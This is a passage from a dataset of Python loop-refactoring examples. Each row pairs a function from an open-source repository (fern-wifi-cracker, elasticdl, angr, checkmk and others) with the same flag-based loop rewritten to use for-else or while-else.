    coords = (x + dx, y + dy)
    if coords not in self.plan or self.plan[coords][0] != BUILDING_PURPOSE.NONE:
        ok = False
        break
    if coords in collector_area:
        accessible = True
if ok:
    total_squares += 1
    if max_num is not None and total_squares >= max_num:
        break
    if accessible:
        available_squares += 1","for (dx, dy) in offsets:
    coords = (x + dx, y + dy)
    if coords not in self.plan or self.plan[coords][0] != BUILDING_PURPOSE.NONE:
        break
    if coords in collector_area:
        accessible = True
else:
    total_squares += 1
    if max_num is not None and total_squares >= max_num:
        break
    if accessible:
        available_squares += 1","for (dx, dy) in offsets:
    coords = (x + dx, y + dy)
    if coords not in self.plan or self.plan[coords][0] != BUILDING_PURPOSE.NONE:
        break
    if coords in collector_area:
        accessible = True
else:
    total_squares += 1
    if max_num is not None and total_squares >= max_num:
        break
    if accessible:
        available_squares += 1",1,"for (dx, dy) in offsets:
    coords = (x + dx, y + dy)
    if coords not in self.plan or self.plan[coords][0] != BUILDING_PURPOSE.NONE:
        ok = False
        break
    if coords in collector_area:
        accessible = True
if ok:
    total_squares += 1
    if max_num is not None and total_squares >= max_num:
        break
    if accessible:
        available_squares += 1","break statement is executed:None
break statement is not executed:zejun1"
fern-wifi-cracker,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/fern-wifi-cracker/Fern-Wifi-Cracker/core/fern.py,https://github.com/savio-code/fern-wifi-cracker/tree/master/Fern-Wifi-Cracker/core/fern.py,mainwindow,refresh_card_thread$411,"def refresh_card_thread(self):
        # Disable cards already on monitor modes
        wireless_interfaces = str(subprocess.getstatusoutput('airmon-ng'))
        prev_monitor = os.listdir('/sys/class/net')
        monitor_interfaces_list = []
        for monitors in prev_monitor:
            if monitors in wireless_interfaces:
                monitor_interfaces_list.append(monitors)
        for monitored_interfaces in monitor_interfaces_list:
            variables.exec_command('airmon-ng stop %s' % (monitored_interfaces))

        # List Interface cards
        compatible_interface = str(subprocess.getoutput(""airmon-ng""))
        interface_list = os.listdir('/sys/class/net')

        # Interate over interface output and update combo box
        isHasCompatibleCard = False
        for interface in interface_list:
            if interface.lower() in compatible_interface.lower():
                isHasCompatibleCard = True
                break

        if not isHasCompatibleCard:
            self.interface_cards_not_found_signal.emit()
        else:
            for interface in interface_list:
                if interface in compatible_interface:
                    if not interface.startswith('mon'):
                        self.interface_cards.append(interface)
            self.interface_cards_found_signal.emit()","for interface in interface_list:
    if interface.lower() in compatible_interface.lower():
        isHasCompatibleCard = True
        break
if not isHasCompatibleCard:
    self.interface_cards_not_found_signal.emit()
else:
    for interface in interface_list:
        if interface in compatible_interface:
            if not interface.startswith('mon'):
                self.interface_cards.append(interface)
    self.interface_cards_found_signal.emit()","for interface in interface_list:
    if interface.lower() in compatible_interface.lower():
        for interface in interface_list:
            if interface in compatible_interface:
                if not interface.startswith('mon'):
                    self.interface_cards.append(interface)
        self.interface_cards_found_signal.emit()
        break
else:
    self.interface_cards_not_found_signal.emit()","for interface in interface_list:
    if interface.lower() in compatible_interface.lower():
        for interface in interface_list:
            if interface in compatible_interface:
                if not interface.startswith('mon'):
                    self.interface_cards.append(interface)
        self.interface_cards_found_signal.emit()
        break
else:
    self.interface_cards_not_found_signal.emit()",1,"for interface in interface_list:
    if interface.lower() in compatible_interface.lower():
        isHasCompatibleCard = True
        break
if not isHasCompatibleCard:
    self.interface_cards_not_found_signal.emit()
else:
    for interface in interface_list:
        if interface in compatible_interface:
            if not interface.startswith('mon'):
                self.interface_cards.append(interface)
    self.interface_cards_found_signal.emit()","break statement is executed:None
break statement is not executed:zejun1"
elasticdl,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/elasticdl/elasticdl/python/worker/ps_client.py,https://github.com/sql-machine-learning/elasticdl/tree/master/elasticdl/python/worker/ps_client.py,,build_ps_client$37,"def build_ps_client(ps_addrs, logger):
    """"""
    Build a PSClient from the address list.
    Args:
        ps_addrs: a string of common separated format that stands for a list
            of address for parameter servers
        logger: a logger object
    Returns:
        A PS Client.
    """"""
    if not ps_addrs:
        return None

    ps_channels = []
    ps_addrs = ps_addrs.split("","")

    for addr in ps_addrs:
        # addr is in the form as ""ps-pod-name.namespace.svc:port""
        channel = build_channel(addr)

        succeeded = False
        for i in range(CONNECT_PS_MAX_RETRIES):
            try:
                grpc.channel_ready_future(channel).result(
                    timeout=CONNECT_PS_TIMEOUT
                )
                logger.info(
                    ""grpc channel %s to connect pod %s is ready""
                    % (addr, addr.split(""."")[0])
                )
                ps_channels.append(channel)
                succeeded = True
                break
            except grpc.FutureTimeoutError:
                logger.warning(
                    ""Failed to connect pod %s with %d retry""
                    % (addr.split(""."")[0], i)
                )

        if not succeeded:
            raise TimeoutError(
                ""Time out to connect pod %s with 3 retries""
                % addr.split(""."")[0]
            )

    ps_client = PSClient(ps_channels)

    return ps_client","for i in range(CONNECT_PS_MAX_RETRIES):
    try:
        grpc.channel_ready_future(channel).result(timeout=CONNECT_PS_TIMEOUT)
        logger.info('grpc channel %s to connect pod %s is ready' % (addr, addr.split('.')[0]))
        ps_channels.append(channel)
        succeeded = True
        break
    except grpc.FutureTimeoutError:
        logger.warning('Failed to connect pod %s with %d retry' % (addr.split('.')[0], i))
if not succeeded:
    raise TimeoutError('Time out to connect pod %s with 3 retries' % addr.split('.')[0])","for i in range(CONNECT_PS_MAX_RETRIES):
    try:
        grpc.channel_ready_future(channel).result(timeout=CONNECT_PS_TIMEOUT)
        logger.info('grpc channel %s to connect pod %s is ready' % (addr, addr.split('.')[0]))
        ps_channels.append(channel)
        break
    except grpc.FutureTimeoutError:
        logger.warning('Failed to connect pod %s with %d retry' % (addr.split('.')[0], i))
else:
    raise TimeoutError('Time out to connect pod %s with 3 retries' % addr.split('.')[0])","for i in range(CONNECT_PS_MAX_RETRIES):
    try:
        grpc.channel_ready_future(channel).result(timeout=CONNECT_PS_TIMEOUT)
        logger.info('grpc channel %s to connect pod %s is ready' % (addr, addr.split('.')[0]))
        ps_channels.append(channel)
        break
    except grpc.FutureTimeoutError:
        logger.warning('Failed to connect pod %s with %d retry' % (addr.split('.')[0], i))
else:
    raise TimeoutError('Time out to connect pod %s with 3 retries' % addr.split('.')[0])",1,"for i in range(CONNECT_PS_MAX_RETRIES):
    try:
        grpc.channel_ready_future(channel).result(timeout=CONNECT_PS_TIMEOUT)
        logger.info('grpc channel %s to connect pod %s is ready' % (addr, addr.split('.')[0]))
        ps_channels.append(channel)
        succeeded = True
        break
    except grpc.FutureTimeoutError:
        logger.warning('Failed to connect pod %s with %d retry' % (addr.split('.')[0], i))
if not succeeded:
    raise TimeoutError('Time out to connect pod %s with 3 retries' % addr.split('.')[0])","break statement is executed:None
break statement is not executed:zejun1"
tf-coreml,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tf-coreml/tfcoreml/_tf_coreml_converter.py,https://github.com/tf-coreml/tf-coreml/tree/master/tfcoreml/_tf_coreml_converter.py,,_check_unsupported_ops$109,"def _check_unsupported_ops(ops, output_feature_names, skip_ops):
  '''
  Checks all the ops till the desired outputs are reached.
  From these ops it collects all the ops that are unsupported.
  Error out if there is at least one unsupported op.
  :param ops: ops of the TF graph
  :param output_feature_names: [str]: list of output names
  :param skip_ops: [str]: list of op names that can be skipped since they either do not depend on the
  actual value of the input or do not connect to the final output
  '''
  unsupported_op_types = []
  outputs_encountered = {}
  for op in ops:
    all_outputs_reached = True
    for out in output_feature_names:
      if out not in outputs_encountered:
        all_outputs_reached = False
        break
    if all_outputs_reached:
      break
    if op.type not in _ops_to_layers._OP_REGISTRY and \
       op.type not in unsupported_op_types and \
       op.name not in skip_ops:
      unsupported_op_types.append(op.type)
    for out in op.outputs:
      outputs_encountered[out.name] = True
  if len(unsupported_op_types) > 0:
      raise NotImplementedError(""Unsupported Ops of type: %s"" % (
        ','.join(unsupported_op_types)))","for out in output_feature_names:
    if out not in outputs_encountered:
        all_outputs_reached = False
        break
if all_outputs_reached:
    break","for out in output_feature_names:
    if out not in outputs_encountered:
        break
else:
    break","for out in output_feature_names:
    if out not in outputs_encountered:
        break
else:
    break",1,"for out in output_feature_names:
    if out not in outputs_encountered:
        all_outputs_reached = False
        break
if all_outputs_reached:
    break","break statement is executed:None
break statement is not executed:zejun1"
JioNLP,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/JioNLP/jionlp/textaug/back_translation/back_translation.py,https://github.com/dongrixinyu/JioNLP/tree/master/jionlp/textaug/back_translation/back_translation.py,BackTranslation,iter_api_by_language$122,"def iter_api_by_language(self, text, mt_api):
        """""" 迭代 某个 api 的所有可选的目标语言，并回译回去

        Args:
            text(str): 待回译文本
            mt_api: 某个翻译的 api 对象

        Return:
            list(str): 由该 mt_api 回译得到的文本 list

        """"""
        # 准备待遍历外文语言标记符
        lang_list = mt_api.lang_pool

        def _filter_chinese(lang_list):
            # 过滤掉中文的标记，仅保留外文标记，用于遍历
            chinese_lang = None
            foreign_lang_list = list()
            for lang in lang_list:
                match_flag = False
                for chinese_ali in self.chinese_alias:
                    if chinese_ali in lang:
                        match_flag = True
                        chinese_lang = lang
                        break
                if not match_flag:
                    foreign_lang_list.append(lang)

            return foreign_lang_list, chinese_lang

        foreign_lang_list, chinese_lang = _filter_chinese(lang_list)

        # 遍历所有的回译调用结果
        api_result_list = list()
        for foreign_lang in foreign_lang_list:
            try:
                tmp = mt_api(text, from_lang=chinese_lang, to_lang=foreign_lang)
                result = mt_api(tmp, from_lang=foreign_lang, to_lang=chinese_lang)
                api_result_list.append(result)
            except Exception as err:
                traceback.print_exc()

        return api_result_list","for chinese_ali in self.chinese_alias:
    if chinese_ali in lang:
        match_flag = True
        chinese_lang = lang
        break
if not match_flag:
    foreign_lang_list.append(lang)","for chinese_ali in self.chinese_alias:
    if chinese_ali in lang:
        chinese_lang = lang
        break
else:
    foreign_lang_list.append(lang)","for chinese_ali in self.chinese_alias:
    if chinese_ali in lang:
        chinese_lang = lang
        break
else:
    foreign_lang_list.append(lang)",1,"for chinese_ali in self.chinese_alias:
    if chinese_ali in lang:
        match_flag = True
        chinese_lang = lang
        break
if not match_flag:
    foreign_lang_list.append(lang)","break statement is executed:None
break statement is not executed:zejun1"
angr,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/angr/angr/analyses/decompiler/callsite_maker.py,https://github.com/angr/angr/tree/master/angr/analyses/decompiler/callsite_maker.py,CallSiteMaker,_determine_variadic_arguments_for_format_strings$291,"def _determine_variadic_arguments_for_format_strings(self, func, cc: 'SimCC', call_stmt) -> Optional[int]:
        proto = func.prototype
        if proto is None:
            # TODO: Support cases where prototypes are not available
            return None

        #
        # get the format string
        #

        potential_fmt_args: List[int] = [ ]
        for idx, arg in enumerate(proto.args):
            if isinstance(arg, SimTypePointer) and isinstance(arg.pts_to, SimTypeChar):
                # find a char*
                # we assume this is the format string
                potential_fmt_args.append(idx)

        if not potential_fmt_args:
            return None

        fmt_str = None
        min_arg_count = (max(potential_fmt_args) + 1)
        arg_locs = cc.arg_locs(is_fp=[False] * min_arg_count,
                               sizes=[self.project.arch.bytes] * min_arg_count
                               )

        for fmt_arg_idx in potential_fmt_args:
            arg_loc = arg_locs[fmt_arg_idx]

            if isinstance(arg_loc, SimRegArg):
                value, _ = self._resolve_register_argument(call_stmt, arg_loc)
            elif isinstance(arg_loc, SimStackArg):
                value, _ = self._resolve_stack_argument(call_stmt, arg_loc)
            else:
                # Unexpected type of argument
                l.warning(""Unexpected type of argument type %s."", arg_loc.__class__)
                return None

            if isinstance(value, int):
                fmt_str = self._load_string(value)
                if fmt_str:
                    break

        if not fmt_str:
            return None

        #
        # parse the format string
        #

        parser = FormatParser(project=self.project)
        fmt_str_list = [ bytes([b]) for b in fmt_str ]
        components = parser.extract_components(fmt_str_list)

        specifiers = [component for component in components if isinstance(component, FormatSpecifier)]
        if not specifiers:
            return None
        return len(specifiers)","for fmt_arg_idx in potential_fmt_args:
    arg_loc = arg_locs[fmt_arg_idx]
    if isinstance(arg_loc, SimRegArg):
        (value, _) = self._resolve_register_argument(call_stmt, arg_loc)
    elif isinstance(arg_loc, SimStackArg):
        (value, _) = self._resolve_stack_argument(call_stmt, arg_loc)
    else:
        l.warning('Unexpected type of argument type %s.', arg_loc.__class__)
        return None
    if isinstance(value, int):
        fmt_str = self._load_string(value)
        if fmt_str:
            break
if not fmt_str:
    return None","for fmt_arg_idx in potential_fmt_args:
    arg_loc = arg_locs[fmt_arg_idx]
    if isinstance(arg_loc, SimRegArg):
        (value, _) = self._resolve_register_argument(call_stmt, arg_loc)
    elif isinstance(arg_loc, SimStackArg):
        (value, _) = self._resolve_stack_argument(call_stmt, arg_loc)
    else:
        l.warning('Unexpected type of argument type %s.', arg_loc.__class__)
        return None
    if isinstance(value, int):
        fmt_str = self._load_string(value)
        if fmt_str:
            break
else:
    return None","for fmt_arg_idx in potential_fmt_args:
    arg_loc = arg_locs[fmt_arg_idx]
    if isinstance(arg_loc, SimRegArg):
        (value, _) = self._resolve_register_argument(call_stmt, arg_loc)
    elif isinstance(arg_loc, SimStackArg):
        (value, _) = self._resolve_stack_argument(call_stmt, arg_loc)
    else:
        l.warning('Unexpected type of argument type %s.', arg_loc.__class__)
        return None
    if isinstance(value, int):
        fmt_str = self._load_string(value)
        if fmt_str:
            break
else:
    return None",1,"for fmt_arg_idx in potential_fmt_args:
    arg_loc = arg_locs[fmt_arg_idx]
    if isinstance(arg_loc, SimRegArg):
        (value, _) = self._resolve_register_argument(call_stmt, arg_loc)
    elif isinstance(arg_loc, SimStackArg):
        (value, _) = self._resolve_stack_argument(call_stmt, arg_loc)
    else:
        l.warning('Unexpected type of argument type %s.', arg_loc.__class__)
        return None
    if isinstance(value, int):
        fmt_str = self._load_string(value)
        if fmt_str:
            break
if not fmt_str:
    return None","break statement is executed:None
break statement is not executed:zejun1"
specter-desktop,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/specter-desktop/src/cryptoadvance/specter/util/wallet_importer.py,https://github.com/cryptoadvance/specter-desktop/tree/master/src/cryptoadvance/specter/util/wallet_importer.py,WalletImporter,parse_signers$72,"def parse_signers(self, devices, cosigners_types):
        keys = []
        cosigners = []
        unknown_cosigners = []
        unknown_cosigners_types = []

        for i, descriptor_key in enumerate(self.descriptor.keys):
            # remove derivation from the key for comparison
            account_key = DescriptorKey.from_string(str(descriptor_key))
            account_key.allowed_derivation = None
            # Specter Key class
            desc_key = Key.parse_xpub(str(account_key))
            cosigner_found = False
            for cosigner in devices.values():
                for key in cosigner.keys:
                    # check key matches
                    if key.to_string(slip132=False) == desc_key.to_string(
                        slip132=False
                    ):
                        keys.append(key)
                        cosigners.append(cosigner)
                        cosigner_found = True
                        break
                if cosigner_found:
                    break
            if not cosigner_found:
                if len(cosigners_types) > i:
                    unknown_cosigners.append((desc_key, cosigners_types[i][""label""]))
                else:
                    unknown_cosigners.append((desc_key, None))
                if len(unknown_cosigners) > len(cosigners_types):
                    unknown_cosigners_types.append(""other"")
                else:
                    unknown_cosigners_types.append(cosigners_types[i][""type""])

        return (keys, cosigners, unknown_cosigners, unknown_cosigners_types)","for cosigner in devices.values():
    for key in cosigner.keys:
        if key.to_string(slip132=False) == desc_key.to_string(slip132=False):
            keys.append(key)
            cosigners.append(cosigner)
            cosigner_found = True
            break
    if cosigner_found:
        break
if not cosigner_found:
    if len(cosigners_types) > i:
        unknown_cosigners.append((desc_key, cosigners_types[i]['label']))
    else:
        unknown_cosigners.append((desc_key, None))
    if len(unknown_cosigners) > len(cosigners_types):
        unknown_cosigners_types.append('other')
    else:
        unknown_cosigners_types.append(cosigners_types[i]['type'])","for cosigner in devices.values():
    for key in cosigner.keys:
        if key.to_string(slip132=False) == desc_key.to_string(slip132=False):
            keys.append(key)
            cosigners.append(cosigner)
            cosigner_found = True
            break
    if cosigner_found:
        break
else:
    if len(cosigners_types) > i:
        unknown_cosigners.append((desc_key, cosigners_types[i]['label']))
    else:
        unknown_cosigners.append((desc_key, None))
    if len(unknown_cosigners) > len(cosigners_types):
        unknown_cosigners_types.append('other')
    else:
        unknown_cosigners_types.append(cosigners_types[i]['type'])","for cosigner in devices.values():
    for key in cosigner.keys:
        if key.to_string(slip132=False) == desc_key.to_string(slip132=False):
            keys.append(key)
            cosigners.append(cosigner)
            cosigner_found = True
            break
    if cosigner_found:
        break
else:
    if len(cosigners_types) > i:
        unknown_cosigners.append((desc_key, cosigners_types[i]['label']))
    else:
        unknown_cosigners.append((desc_key, None))
    if len(unknown_cosigners) > len(cosigners_types):
        unknown_cosigners_types.append('other')
    else:
        unknown_cosigners_types.append(cosigners_types[i]['type'])",1,"for cosigner in devices.values():
    for key in cosigner.keys:
        if key.to_string(slip132=False) == desc_key.to_string(slip132=False):
            keys.append(key)
            cosigners.append(cosigner)
            cosigner_found = True
            break
    if cosigner_found:
        break
if not cosigner_found:
    if len(cosigners_types) > i:
        unknown_cosigners.append((desc_key, cosigners_types[i]['label']))
    else:
        unknown_cosigners.append((desc_key, None))
    if len(unknown_cosigners) > len(cosigners_types):
        unknown_cosigners_types.append('other')
    else:
        unknown_cosigners_types.append(cosigners_types[i]['type'])","break statement is executed:None
break statement is not executed:zejun1"
avalanche,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/avalanche/avalanche/training/plugins/synaptic_intelligence.py,https://github.com/ContinualAI/avalanche/tree/master/avalanche/training/plugins/synaptic_intelligence.py,SynapticIntelligencePlugin,not_excluded_parameters$352,"def not_excluded_parameters(
        model: Module, excluded_parameters: Set[str]
    ) -> Sequence[Tuple[str, Tensor]]:
        # Add wildcards "".*"" to all excluded parameter names
        result: List[Tuple[str, Tensor]] = []
        excluded_parameters = (
            SynapticIntelligencePlugin.explode_excluded_parameters(
                excluded_parameters
            )
        )
        layers_params = get_layers_and_params(model)

        for lp in layers_params:
            if isinstance(lp.layer, _NormBase):
                # Exclude batch norm parameters
                excluded_parameters.add(lp.parameter_name)

        for name, param in model.named_parameters():
            accepted = True
            for exclusion_pattern in excluded_parameters:
                if fnmatch(name, exclusion_pattern):
                    accepted = False
                    break

            if accepted:
                result.append((name, param))

        return result","for exclusion_pattern in excluded_parameters:
    if fnmatch(name, exclusion_pattern):
        accepted = False
        break
if accepted:
    result.append((name, param))","for exclusion_pattern in excluded_parameters:
    if fnmatch(name, exclusion_pattern):
        break
else:
    result.append((name, param))","for exclusion_pattern in excluded_parameters:
    if fnmatch(name, exclusion_pattern):
        break
else:
    result.append((name, param))",1,"for exclusion_pattern in excluded_parameters:
    if fnmatch(name, exclusion_pattern):
        accepted = False
        break
if accepted:
    result.append((name, param))","break statement is executed:None
break statement is not executed:zejun1"
virt-manager,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/virt-manager/virtManager/createvm.py,https://github.com/virt-manager/virt-manager/tree/master/virtManager/createvm.py,vmmCreateVM,_do_async_install$1980,"def _do_async_install(self, asyncjob, guest, installer, bootstrap_args):
        """"""
        Kick off the actual install
        """"""
        meter = asyncjob.get_meter()

        if bootstrap_args:
            # Start container bootstrap
            self._create_directory_tree(asyncjob, meter, bootstrap_args)
            if asyncjob.has_error():
                # Do not continue if virt-bootstrap failed
                return

        # Build a list of pools we should refresh, if we are creating storage
        refresh_pools = []
        for disk in guest.devices.disk:
            if not disk.wants_storage_creation():
                continue

            pool = disk.get_parent_pool()
            if not pool:
                continue  # pragma: no cover

            poolname = pool.name()
            if poolname not in refresh_pools:
                refresh_pools.append(poolname)

        log.debug(""Starting background install process"")
        installer.start_install(guest, meter=meter)
        log.debug(""Install completed"")

        # Wait for VM to show up
        self.conn.schedule_priority_tick(pollvm=True)
        count = 0
        foundvm = None
        while count < 200:
            for vm in self.conn.list_vms():
                if vm.get_uuid() == guest.uuid:
                    foundvm = vm
            if foundvm:
                break
            count += 1
            time.sleep(.1)

        if not foundvm:
            raise RuntimeError(  # pragma: no cover
                _(""VM '%s' didn't show up after expected time."") % guest.name)
        vm = foundvm

        if vm.is_shutoff():
            # Domain is already shutdown, but no error was raised.
            # Probably means guest had no 'install' phase, as in
            # for live cds. Try to restart the domain.
            vm.startup()  # pragma: no cover
        elif installer.has_install_phase():
            # Register a status listener, which will restart the
            # guest after the install has finished
            def cb():
                vm.connect_opt_out(""state-changed"",
                                   self._check_install_status)
                return False
            self.idle_add(cb)

        # Kick off pool updates
        for poolname in refresh_pools:
            try:
                pool = self.conn.get_pool_by_name(poolname)
                self.idle_add(pool.refresh)
            except Exception:  # pragma: no cover
                log.debug(""Error looking up pool=%s for refresh after ""
                    ""VM creation."", poolname, exc_info=True)","while count < 200:
    for vm in self.conn.list_vms():
        if vm.get_uuid() == guest.uuid:
            foundvm = vm
    if foundvm:
        break
    count += 1
    time.sleep(0.1)
if not foundvm:
    raise RuntimeError(_(""VM '%s' didn't show up after expected time."") % guest.name)","while count < 200:
    for vm in self.conn.list_vms():
        if vm.get_uuid() == guest.uuid:
            foundvm = vm
    if foundvm:
        break
    count += 1
    time.sleep(0.1)
else:
    raise RuntimeError(_(""VM '%s' didn't show up after expected time."") % guest.name)","while count < 200:
    for vm in self.conn.list_vms():
        if vm.get_uuid() == guest.uuid:
            foundvm = vm
    if foundvm:
        break
    count += 1
    time.sleep(0.1)
else:
    raise RuntimeError(_(""VM '%s' didn't show up after expected time."") % guest.name)",1,"while count < 200:
    for vm in self.conn.list_vms():
        if vm.get_uuid() == guest.uuid:
            foundvm = vm
    if foundvm:
        break
    count += 1
    time.sleep(0.1)
if not foundvm:
    raise RuntimeError(_(""VM '%s' didn't show up after expected time."") % guest.name)","break statement is executed:None
break statement is not executed:zejun1"
checkmk,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/checkmk/cmk/gui/valuespec.py,https://github.com/tribe29/checkmk/tree/master/cmk/gui/valuespec.py,FileUpload,_validate_value$5902,"def _validate_value(self, value: _Optional[UploadedFile], varprefix: str) -> None:
        if not value:
            raise MKUserError(varprefix, _(""Please select a file.""))

        file_name, _mime_type, content = value

        if not self._allow_empty and (content == b"""" or file_name == """"):
            raise MKUserError(varprefix, _(""Please select a file.""))

        if not self._allow_empty_content and not content:
            raise MKUserError(
                varprefix, _(""The selected file is empty. Please select a non-empty file."")
            )
        if self._allowed_extensions is not None:
            matched = False
            for extension in self._allowed_extensions:
                if file_name.endswith(extension):
                    matched = True
                    break
            if not matched:
                raise MKUserError(
                    varprefix,
                    _(""Invalid file name extension. Allowed are: %s"")
                    % "", "".join(self._allowed_extensions),
                )","for extension in self._allowed_extensions:
    if file_name.endswith(extension):
        matched = True
        break
if not matched:
    raise MKUserError(varprefix, _('Invalid file name extension. Allowed are: %s') % ', '.join(self._allowed_extensions))","for extension in self._allowed_extensions:
    if file_name.endswith(extension):
        break
else:
    raise MKUserError(varprefix, _('Invalid file name extension. Allowed are: %s') % ', '.join(self._allowed_extensions))","for extension in self._allowed_extensions:
    if file_name.endswith(extension):
        break
else:
    raise MKUserError(varprefix, _('Invalid file name extension. Allowed are: %s') % ', '.join(self._allowed_extensions))",1,"for extension in self._allowed_extensions:
    if file_name.endswith(extension):
        matched = True
        break
if not matched:
    raise MKUserError(varprefix, _('Invalid file name extension. Allowed are: %s') % ', '.join(self._allowed_extensions))","break statement is executed:None
break statement is not executed:zejun1"
dm_control,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/dm_control/dm_control/composer/initializers/prop_initializer.py,https://github.com/deepmind/dm_control/tree/master/dm_control/composer/initializers/prop_initializer.py,PropPlacer,__call__$159,"def __call__(self, physics, random_state, ignore_contacts_with_entities=None):
    """"""Sets initial prop poses.

    Args:
      physics: An `mjcf.Physics` instance.
      random_state: a `np.random.RandomState` instance.
      ignore_contacts_with_entities: a list of `composer.Entity` instances
        to ignore when detecting collisions. This can be used to ignore props
        that are not being placed by this initializer, but are known to be
        colliding in the current state of the simulation (for example if they
        are going to be placed by a different initializer that will be called
        subsequently).

    Raises:
      RuntimeError: If `ignore_collisions == False` and a non-colliding prop
        pose could not be found within `max_attempts_per_prop`.
    """"""
    if ignore_contacts_with_entities is None:
      ignore_contacts_with_entities = []
    # Temporarily disable contacts for all geoms that belong to props which
    # haven't yet been placed in order to free up space in the contact buffer.
    cached_contact_params = self._disable_and_cache_contact_parameters(
        physics, self._props + ignore_contacts_with_entities)

    try:
      physics.forward()
    except control.PhysicsError as cause:
      effect = control.PhysicsError(
          'Despite disabling contact for all props in this initializer, '
          '`physics.forward()` resulted in a `PhysicsError`')
      raise effect from cause

    def place_props():
      for prop in self._props:
        # Restore the original contact parameters for all geoms in the prop
        # we're about to place, so that we can detect if the new pose results in
        # collisions.
        self._restore_contact_parameters(physics, prop, cached_contact_params)

        success = False
        initial_position, initial_quaternion = prop.get_pose(physics)
        next_position, next_quaternion = initial_position, initial_quaternion
        for _ in range(self._max_attempts_per_prop):
          next_position = variation.evaluate(self._position,
                                             initial_value=initial_position,
                                             current_value=next_position,
                                             random_state=random_state)
          next_quaternion = variation.evaluate(self._quaternion,
                                               initial_value=initial_quaternion,
                                               current_value=next_quaternion,
                                               random_state=random_state)
          prop.set_pose(physics, next_position, next_quaternion)
          try:
            # If this pose results in collisions then there's a chance we'll
            # encounter a PhysicsError error here due to a full contact buffer,
            # in which case reject this pose and sample another.
            physics.forward()
          except control.PhysicsError:
            continue

          if (self._ignore_collisions
              or not self._has_collisions_with_prop(physics, prop)):
            success = True
            break

        if not success:
          raise RuntimeError(_REJECTION_SAMPLING_FAILED.format(
              model_name=prop.mjcf_model.model,
              max_attempts=self._max_attempts_per_prop))

      for prop in ignore_contacts_with_entities:
        self._restore_contact_parameters(physics, prop, cached_contact_params)

    # Place the props and settle the physics. If settling was requested and it
    # it fails, re-place the props.
    def place_and_settle():
      for _ in range(self._max_settle_physics_attempts):
        place_props()

        # Step physics and check prop states.
        original_time = physics.data.time
        props_isolator = utils.JointStaticIsolator(physics, self._prop_joints)
        prop_joints_mj = physics.bind(self._prop_joints)
        while physics.data.time - original_time < self._max_settle_physics_time:
          with props_isolator:
            physics.step()
          max_qvel = np.max(np.abs(prop_joints_mj.qvel))
          max_qacc = np.max(np.abs(prop_joints_mj.qacc))
          if (max_qvel < self._max_qvel_tol) and (
              max_qacc < self._max_qacc_tol) and (
                  physics.data.time - original_time
                  ) > self._min_settle_physics_time:
            return True
        physics.data.time = original_time

      if self._raise_exception_on_settle_failure:
        raise RuntimeError(
            _SETTLING_PHYSICS_FAILED.format(
                max_attempts=self._max_settle_physics_attempts,
                max_time=self._max_settle_physics_time,
                max_qvel=max_qvel,
                max_qacc=max_qacc,
            ))
      else:
        log_str = _SETTLING_PHYSICS_FAILED.format(
            max_attempts='%s',
            max_time='%s',
            max_qvel='%s',
            max_qacc='%s',
        )
        logging.warning(log_str, self._max_settle_physics_attempts,
                        self._max_settle_physics_time, max_qvel, max_qacc)

      return False

    if self._settle_physics:
      place_and_settle()
    else:
      place_props()","for _ in range(self._max_attempts_per_prop):
    next_position = variation.evaluate(self._position, initial_value=initial_position, current_value=next_position, random_state=random_state)
    next_quaternion = variation.evaluate(self._quaternion, initial_value=initial_quaternion, current_value=next_quaternion, random_state=random_state)
    prop.set_pose(physics, next_position, next_quaternion)
    try:
        physics.forward()
    except control.PhysicsError:
        continue
    if self._ignore_collisions or not self._has_collisions_with_prop(physics, prop):
        success = True
        break
if not success:
    raise RuntimeError(_REJECTION_SAMPLING_FAILED.format(model_name=prop.mjcf_model.model, max_attempts=self._max_attempts_per_prop))","for _ in range(self._max_attempts_per_prop):
    next_position = variation.evaluate(self._position, initial_value=initial_position, current_value=next_position, random_state=random_state)
    next_quaternion = variation.evaluate(self._quaternion, initial_value=initial_quaternion, current_value=next_quaternion, random_state=random_state)
    prop.set_pose(physics, next_position, next_quaternion)
    try:
        physics.forward()
    except control.PhysicsError:
        continue
    if self._ignore_collisions or not self._has_collisions_with_prop(physics, prop):
        break
else:
    raise RuntimeError(_REJECTION_SAMPLING_FAILED.format(model_name=prop.mjcf_model.model, max_attempts=self._max_attempts_per_prop))","for _ in range(self._max_attempts_per_prop):
    next_position = variation.evaluate(self._position, initial_value=initial_position, current_value=next_position, random_state=random_state)
    next_quaternion = variation.evaluate(self._quaternion, initial_value=initial_quaternion, current_value=next_quaternion, random_state=random_state)
    prop.set_pose(physics, next_position, next_quaternion)
    try:
        physics.forward()
    except control.PhysicsError:
        continue
    if self._ignore_collisions or not self._has_collisions_with_prop(physics, prop):
        break
else:
    raise RuntimeError(_REJECTION_SAMPLING_FAILED.format(model_name=prop.mjcf_model.model, max_attempts=self._max_attempts_per_prop))",1,"for _ in range(self._max_attempts_per_prop):
    next_position = variation.evaluate(self._position, initial_value=initial_position, current_value=next_position, random_state=random_state)
    next_quaternion = variation.evaluate(self._quaternion, initial_value=initial_quaternion, current_value=next_quaternion, random_state=random_state)
    prop.set_pose(physics, next_position, next_quaternion)
    try:
        physics.forward()
    except control.PhysicsError:
        continue
    if self._ignore_collisions or not self._has_collisions_with_prop(physics, prop):
        success = True
        break
if not success:
    raise RuntimeError(_REJECTION_SAMPLING_FAILED.format(model_name=prop.mjcf_model.model, max_attempts=self._max_attempts_per_prop))","break statement is executed:None
break statement is not executed:zejun1"
nucypher,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/nucypher/nucypher/utilities/networking.py,https://github.com/nucypher/nucypher/tree/master/nucypher/utilities/networking.py,,get_external_ip_from_default_teacher$98,"def get_external_ip_from_default_teacher(network: str,
                                         federated_only: bool = False,
                                         registry: Optional[BaseContractRegistry] = None,
                                         log: Logger = IP_DETECTION_LOGGER
                                         ) -> Union[str, None]:

    # Prevents circular imports
    from nucypher.characters.lawful import Ursula
    from nucypher.network.nodes import TEACHER_NODES

    if federated_only and registry:
        raise ValueError('Federated mode must not be true if registry is provided.')

    base_error = 'Cannot determine IP using default teacher'

